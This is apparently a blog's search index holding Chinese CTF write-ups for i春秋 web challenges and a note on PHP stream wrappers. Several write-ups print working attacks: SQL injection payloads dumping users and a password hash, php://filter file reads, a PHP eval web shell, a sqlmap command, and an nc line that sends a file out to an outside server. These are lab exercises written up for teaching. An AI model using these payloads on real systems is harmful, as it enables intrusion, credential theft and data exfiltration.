<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>i春秋-Web-时间</title>
      <link href="/2018/09/12/ichunqiu-web-time/"/>
      <url>/2018/09/12/ichunqiu-web-time/</url>
      <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">    <span class="string">'天下武功唯快不破'</span>;</span><br><span class="line">    setcookie(<span class="string">'token'</span>,<span class="string">'hello'</span>);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">'token'</span>]==<span class="string">'hello'</span>)&#123;</span><br><span class="line">    $txt = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">    $filename = <span class="string">'u/'</span>.md5(mt_rand(<span class="number">1</span>,<span class="number">1000</span>)).<span class="string">'.txt'</span>;</span><br><span class="line">    file_put_contents($filename,$txt);</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    unlink($filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>分析代码，知道在第二次访问首页后，会把 <code>flag</code> 写入一个txt文件，位置 <code>u/md5(随机1-1000的数字).txt</code>，十秒后会删除这个文件。</p><p>这道题主要就是拼速度。在第二次访问首页后，立刻开始爆破。</p><p>我使用的BurpSuite自带的爆破模块，开了 <code>50</code> 个线程，跑出来了。</p><p><img src="/2018/09/12/ichunqiu-web-time/flag.png" alt="flag"></p>]]></content>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关于PHP的伪协议</title>
      <link href="/2018/09/11/php-pseudo-protocol/"/>
      <url>/2018/09/11/php-pseudo-protocol/</url>
      <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>目前PHP支持以下类型的协议。</p><ul><li><p>file:// — 访问本地文件系统</p></li><li><p>http:// — 访问 HTTP(s) 网址</p></li><li><p>ftp:// — 访问 FTP(s) URLs</p></li><li><p>php:// — 访问各个输入/输出流（I/O streams）</p></li><li><p>zlib:// — 压缩流</p></li><li><p>data:// — 数据（RFC 2397）</p></li><li><p>glob:// — 查找匹配的文件路径模式</p></li><li><p>phar:// — PHP 归档</p></li><li><p>ssh2:// — Secure Shell 2</p></li><li><p>rar:// — RAR</p></li><li><p>ogg:// — 音频流</p></li><li><p>expect:// — 处理交互式的流</p></li></ul><h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><p>在 <code>CTF</code> 中，最常用的是 <code>php://</code>，提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 </p><p>这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。 </p><p><code>php://filter</code> 目标使用以下的参数作为它路径的一部分。</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr></tbody></table><p>read=&lt;读链的筛选列表&gt;|可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>write=&lt;写链的筛选列表&gt;|可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>&lt;；两个链的筛选列表&gt;|任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</p><h3 id="php-stdin-php-stdout-和-php-stderr"><a href="#php-stdin-php-stdout-和-php-stderr" class="headerlink" title="php://stdin, php://stdout 和 php://stderr"></a>php://stdin, php://stdout 和 php://stderr</h3><p><code>php://stdin</code>、<code>php://stdout</code> 和 <code>php://stderr</code> 允许直接访问 PHP 进程相应的输入或者输出流。</p><blockquote><p><code>php://stdin</code> 是只读的，<code>php://stdout</code> 和 <code>php://stderr</code> 是只写的。</p></blockquote><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code> 是个可以访问请求的原始数据的只读流。</p><blockquote><p>enctype=”multipart/form-data” 的时候 <code>php://input</code> 是无效的。 </p></blockquote><h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p><code>php://output</code> 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 </p><h3 id="php-fd"><a href="#php-fd" class="headerlink" title="php://fd"></a>php://fd</h3><p><code>php://fd</code> 允许直接访问指定的文件描述符。</p><p>例如 <code>php://fd/3</code> 引用了文件描述符 3。 </p><h3 id="php-memory、php-temp"><a href="#php-memory、php-temp" class="headerlink" title="php://memory、php://temp"></a>php://memory、php://temp</h3><p><code>php://memory</code> 和 <code>php://temp</code> 是一个类似文件 包装器的数据流，允许读写临时数据。</p><p>两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中， 而 <code>php://temp</code> 会在内存达到预定义的限制后（默认是 2MB）存入临时文件中。<br>临时文件位置和 <code>sys_get_temp_dir()</code> 的结果一致。 </p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://cn2.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">支持的协议和封装协议</a></p><p><a href="http://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">php伪协议实现命令执行的七种姿势</a></p>]]></content>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-BLOG</title>
      <link href="/2018/09/11/ichunqiu-web-BLOG/"/>
      <url>/2018/09/11/ichunqiu-web-BLOG/</url>
      <content type="html"><![CDATA[<p>一个BLOG，注册后登录，发现使用了 <code>kindeditor 4.1.10</code> 编辑器，这个编辑器存在目录遍历漏洞，访问 <code>/kindeditor/php/file_manager_json.php?path=../</code>，会泄露目录内文件。</p><p><img src="/2018/09/11/ichunqiu-web-BLOG/kindeditor.png" alt="kindeditor"></p><p>发现 <code>flag</code> 就在网站根目录下，但是没办法访问到。</p><p>继续摸索，有个发文章的功能，存在SQL注入，INSERT型。</p><p>通过INSERT可以批量添加记录的特性，判断出当前表存在4个字段。</p><p>Payload:</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’) # 报错<br>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’,’ddd’) # 成功</p></blockquote><p>根据回显，得出第二个字段是标题，第三个字段是内容。</p><p>开始爆数据：</p><ul><li><p>爆表名</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(table_name) from information_schema.tables where table_schema = database()),’ccc’,’ddd’) # 得到表 [posts,users]</p></blockquote></li><li><p>爆字段</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select table_name, column_name from information_schema.columns where table_name = ‘users’ # 得到两个字段 [username,password]</p></blockquote></li><li><p>爆用户</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(username) from users ),’ccc’,’ddd’) # 得到用户名 admin </p></blockquote></li><li><p>爆密码</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(password) from users ),’ccc’,’ddd’) # 得到密码HASH dbb616c5d935d8f34c12c291066d6fb7，解密后 melody123</p></blockquote></li></ul><p>重新以 <code>admin</code> 身份登录，发现新的入口 <code>/blog_manage/manager.php?module=article_manage&amp;name=php</code>，看链接，长得就像文件包含漏洞。</p><p>测试后，发现确实是这个问题。</p><p>构造链接， <code>/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code>，成功读到 <code>flag</code>。</p><p><img src="/2018/09/11/ichunqiu-web-BLOG/flag.png" alt="flag"></p>]]></content>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> BLOG </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ichunqiu-web-Upload</title>
      <link href="/2018/09/11/ichunqiu-web-Upload/"/>
      <url>/2018/09/11/ichunqiu-web-Upload/</url>
      <content type="html"><![CDATA[<p>上传题，可以直接上传 <code>php</code> 脚本，但是会过滤 <code>&lt;?</code>，<code>php</code>，把它们替换为空，所以一般的 <code>php</code> 脚本都无法执行。</p><p>网上找了个特殊的一句话。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">'cmd'</span>])&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>菜刀连接，成功拿到 <code>shell</code>。</p><p><img src="/2018/09/11/ichunqiu-web-Upload/flag.png" alt="flag"></p>]]></content>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> PHP </tag>
            
            <tag> Upload </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-破译</title>
      <link href="/2018/09/11/ichunqiu-web-decode/"/>
      <url>/2018/09/11/ichunqiu-web-decode/</url>
      <content type="html"><![CDATA[<p>题目是给了一串密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TW5650Y - 0TS UZ50S S0V LZW UZ50WKW 9505KL4G 1X WVMUSL510 S001M0UWV 910VSG S0 WFLW0K510 1X LZW54 WF5KL50Y 2S4L0W4KZ52 L1 50U14214SLW X5L0WKK S0V TSK7WLTS88 VWNW8129W0L 50 W8W9W0LS4G, 95VV8W S0V Z5YZ KUZ118K SU41KK UZ50S.LZW S001M0UW9W0L ESK 9SVW SL S K5Y050Y UW4W910G L1VSG TG 0TS UZ50S UW1 VSN5V KZ1W9S7W4 S0V FM LS1, V54WUL14 YW0W4S8 1X LZW 50LW40SL510S8 U112W4SL510 S0V WFUZS0YW VW2S4L9W0L 1X LZW 9505KL4G 1X WVMUSL510.</span><br><span class="line">&quot;EW S4W WFU5LWV L1 T41SVW0 1M4 2S4L0W4KZ52 E5LZ LZW 9505KL4G 1X WVMUSL510 L1 9S7W S 810Y-8SKL50Y 592SUL 10 LZW 85NWK 1X UZ50WKW KLMVW0LK LZ41MYZ S 6150L8G-VWK5Y0WV TSK7WLTS88 UM445UM8M9 S0V S E5VW 4S0YW 1X KUZ118 TSK7WLTS88 241Y4S9K,&quot; KS5V KZ1W9S7W4. &quot;LZ5K U1995L9W0L 9S47K S01LZW4 958WKL10W 50 LZW 0TS&apos;K G1MLZ S0V TSK7WLTS88 VWNW8129W0L WXX14LK 50 UZ50S.&quot; X8SY &#123; YK182V9ZUL9STU5V&#125;</span><br></pre></td></tr></table></figure><p>看到末尾的 <code>{ ... }</code> 猜测是凯撒加密，放工具里跑了下，得到以下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E5650G - 0BA CH50A A0D THE CH50ESE 9505ST4O 1F EDUCAT510 A001U0CED 910DAO A0 ENTE0S510 1F THE54 EN5ST50G 2A4T0E4SH52 T1 50C14214ATE F5T0ESS A0D BAS7ETBA88 DEVE8129E0T 50 E8E9E0TA4O, 95DD8E A0D H5GH SCH118S AC41SS CH50A.THE A001U0CE9E0T MAS 9ADE AT A S5G050G CE4E910O T1DAO BO 0BA CH50A CE1 DAV5D SH1E9A7E4 A0D NU TA1, D54ECT14 GE0E4A8 1F THE 50TE40AT510A8 C112E4AT510 A0D ENCHA0GE DE2A4T9E0T 1F THE 9505ST4O 1F EDUCAT510.</span><br><span class="line">&quot;ME A4E ENC5TED T1 B41ADE0 1U4 2A4T0E4SH52 M5TH THE 9505ST4O 1F EDUCAT510 T1 9A7E A 810G-8AST50G 592ACT 10 THE 85VES 1F CH50ESE STUDE0TS TH41UGH A 6150T8O-DES5G0ED BAS7ETBA88 CU445CU8U9 A0D A M5DE 4A0GE 1F SCH118 BAS7ETBA88 241G4A9S,&quot; SA5D SH1E9A7E4. &quot;TH5S C1995T9E0T 9A47S A01THE4 958EST10E 50 THE 0BA&apos;S O1UTH A0D BAS7ETBA88 DEVE8129E0T EFF14TS 50 CH50A.&quot; F8AG &#123; GS182D9HCT9ABC5D&#125;</span><br></pre></td></tr></table></figure><p><code>FLAG</code> 的雏形出来了，看起来是一堆单词，有部分被数字替换了。</p><p>通过分析，找到以下映射关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">8 -&gt; L</span><br><span class="line">0 -&gt; N</span><br><span class="line">5 -&gt; I</span><br><span class="line">1 -&gt; O</span><br><span class="line">7 -&gt; K</span><br><span class="line">2 -&gt; P</span><br><span class="line">9 -&gt; M</span><br><span class="line">4 -&gt; R</span><br></pre></td></tr></table></figure><blockquote><p>还有个6，没找出来，不过不影响。</p></blockquote><p>直接替换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EI6ING - NBA CHINA AND THE CHINESE MINISTRO OF EDUCATION ANNOUNCED MONDAO AN ENTENSION OF THEIR ENISTING PARTNERSHIP TO INCORPORATE FITNESS AND BASKETBALL DEVELOPMENT IN ELEMENTARO, MIDDLE AND HIGH SCHOOLS ACROSS CHINA.THE ANNOUNCEMENT MAS MADE AT A SIGNING CEREMONO TODAO BO NBA CHINA CEO DAVID SHOEMAKER AND NU TAO, DIRECTOR GENERAL OF THE INTERNATIONAL COOPERATION AND ENCHANGE DEPARTMENT OF THE MINISTRO OF EDUCATION.</span><br><span class="line">&quot;ME ARE ENCITED TO BROADEN OUR PARTNERSHIP MITH THE MINISTRO OF EDUCATION TO MAKE A LONG-LASTING IMPACT ON THE LIVES OF CHINESE STUDENTS THROUGH A 6OINTLO-DESIGNED BASKETBALL CURRICULUM AND A MIDE RANGE OF SCHOOL BASKETBALL PROGRAMS,&quot; SAID SHOEMAKER. &quot;THIS COMMITMENT MARKS ANOTHER MILESTONE IN THE NBA&apos;S OOUTH AND BASKETBALL DEVELOPMENT EFFORTS IN CHINA.&quot; FLAG &#123; GSOLPDMHCTMABCID&#125;</span><br></pre></td></tr></table></figure><p>得到 <code>flag</code> ， <code>FLAG{GSOLPDMHCTMABCID}</code>。</p>]]></content>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> 破译 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-EXEC</title>
      <link href="/2018/09/11/ichunqiu-web-EXEC/"/>
      <url>/2018/09/11/ichunqiu-web-EXEC/</url>
      <content type="html"><![CDATA[<p>根据提示，是一道命令执行的题。</p><p>打开以后，提示 <code>no sign</code> ，未登录。</p><p>查看源码，看到 <code>meta</code> 信息里有提示，使用了 <code>vim</code>。猜测可能存在 <code>swp</code> 文件泄露。</p><p>直接访问 <code>.index.php.swp</code> ，成功下载。</p><p>使用命令 <code>vim -r .index.php.swp</code> ，恢复文件，获得以下内容。</p><p>整理内容，得到以下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;blind cmd exec&lt;/title&gt;</span><br><span class="line">&lt;meta language=<span class="string">'utf-8'</span> editor=<span class="string">'vim'</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;img src=pic.gif&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">flag in flag233.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);</span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;</span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'11259375'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">        setcookie(<span class="string">'auth'</span>,<span class="string">'tcp tunnel is forbidden!'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">                $command=$_POST[cmd];</span><br></pre></td></tr></table></figure><p>分析代码，知道需要通过 <code>GET</code> 传入一个 <code>sign</code>参数 ，必须和 <code>11259375</code> 相等，同时参数的每个字符都不能在 <code>1-9</code>之间。</p><p>这里用的是 <code>==</code> ，所以可以传入 <code>0xabcdef</code> 绕过。</p><p>通过外层 <code>if</code> 后，提示 <code>tcp 通道不能使用</code>，然后会执行 <code>cmd</code> 参数的命令。</p><p>这里需要一台服务器监听一个 <code>udp</code> 端口，可以用 <code>nc</code> 实现，</p><blockquote><p>nc -ul 8989</p></blockquote><p><img src="/2018/09/11/ichunqiu-web-EXEC/bp.png" alt="bp"></p><p>传入 <code>cmd=nc -u 服务器地址 端口 &lt; flag233.php</code>，服务器就能接收到 <code>flag233.php</code> 的内容。</p><p><img src="/2018/09/11/ichunqiu-web-EXEC/flag.png" alt="flag"></p>]]></content>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-爆破3</title>
      <link href="/2018/09/10/ichunqiu-web-brute-3/"/>
      <url>/2018/09/10/ichunqiu-web-brute-3/</url>
      <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">        $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">        $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">        $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">    &#125;<span class="comment">//初始化成功次数，时间，whoami</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">        session_destroy();</span><br><span class="line">    &#125;<span class="comment">//超过两分钟，销毁session</span></span><br><span class="line"></span><br><span class="line">    $value = $_REQUEST[<span class="string">'value'</span>]; <span class="comment">//需要爆破的参数</span></span><br><span class="line">    $str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">    $str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)]; <span class="comment">//$str_rands为随机2位英文字母</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">        $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">        <span class="keyword">echo</span> $str_rands;</span><br><span class="line">    &#125;<span class="comment">//传入的参数与whoami比较，且md5值的6~9为必须为0或者字符串。下一个whoami值为当前$str_rands</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="comment">//成功次数&gt;10，打印flag</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里遇到一个小坑，就是md5比较的时候，纯粹要看RP，我本地爆破了半天，最多一次才成功跑到6，就失败了。</p><p>后来想到，可以通过 <code>value[]</code> array参数 来绕过第二个逻辑表达式，一次成功。</p><p>附爆破脚本 (其实手工也可以)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://626f230deed143bcb63490fc62362b9228ecdbe626d84899.game.ichunqiu.com/"</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'accept'</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">'accept-encoding'</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">        <span class="string">'accept-language'</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">        <span class="string">'connection'</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">        <span class="string">'upgrade-insecure-requests'</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">'user-agent'</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># init</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    times = <span class="number">0</span></span><br><span class="line">    whoami = [<span class="string">'e'</span>, <span class="string">'a'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        param = &#123;<span class="string">"value[]"</span>: whoami[<span class="number">0</span>] + whoami[<span class="number">1</span>]&#125;</span><br><span class="line">        response = s.get(url, params=param, headers=headers)</span><br><span class="line">        whoami = response.text[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> whoami[<span class="number">0</span>].isalpha() <span class="keyword">and</span> whoami[<span class="number">1</span>].isalpha():</span><br><span class="line">            times += <span class="number">1</span></span><br><span class="line">            print(whoami, times)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> times == <span class="number">10</span>:</span><br><span class="line">            print(<span class="string">'\n'</span>)</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-爆破2</title>
      <link href="/2018/09/10/ichunqiu-web-brute-2/"/>
      <url>/2018/09/10/ichunqiu-web-brute-2/</url>
      <content type="html"><![CDATA[<p><code>flag</code> 藏在 <code>flag.php</code> 中，要求读出来。</p><p>提示 <code>flag</code> 不在变量中。</p><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$a = @$_REQUEST[&apos;hello&apos;];</span><br><span class="line">eval( &quot;var_dump($a);&quot;);</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure><p><code>eval</code> 会执行参数中的代码。</p><p><code>var_dump</code> 打印变量相关的信息。</p><p><code>$a</code> 是可控的参数，可以传入 <code>file_get_contents</code> 函数，直接读取 <code>flag.php</code> 的内容。</p><p>构造 payload <code>/?hello=file_get_contents(&#39;flag.php&#39;)</code>。</p><p>得到 <code>flag</code>。</p><p><img src="/2018/09/10/ichunqiu-web-brute-2/flag.png" alt="flag"></p>]]></content>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>i春秋-Web-SQLi</title>
      <link href="/2018/09/10/ichunqiu-web-SQLi/"/>
      <url>/2018/09/10/ichunqiu-web-SQLi/</url>
      <content type="html"><![CDATA[<p>一道注入题，登录页面。</p><p>试了常见的万能密码，无效，不存在弱口令。</p><p>使用BP，看下过滤了哪些字符。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/bp-1.png" alt="BP-1"></p><p>发现参数含有<code>%</code>时，报错。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-1.png" alt="SQLi-1"></p><p>提示 <code>Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18</code>，根据提示，判定可能存在<code>sprintf格式化字符串漏洞</code>。</p><p>看下<code>sprintf</code>函数的描述。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/info-1.png" alt="Info-1"></p><p>可以构造payload:<code>admin %1$&#39; or 1=1 #</code>，顶掉占位符，注入sql语句。此处，提示<code>password error!</code></p><p>此处不回显内容，但是有错误提示，只能盲注。</p><p>可以直接用<code>sqlmap</code>跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://b968f913d88e4ce5b916d5f6a2badf2e4568f7626bc84863.game.ichunqiu.com/&quot; --data &quot;username=admin%1$&apos; * #&amp;password=12345&quot; --no-cast -p username --level 3 -T B -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-2.png" alt="SQLi-2"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.colabug.com/4099484.html" target="_blank" rel="noopener">php中利用格式化字符串漏洞绕过addslashes注入</a></p>]]></content>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
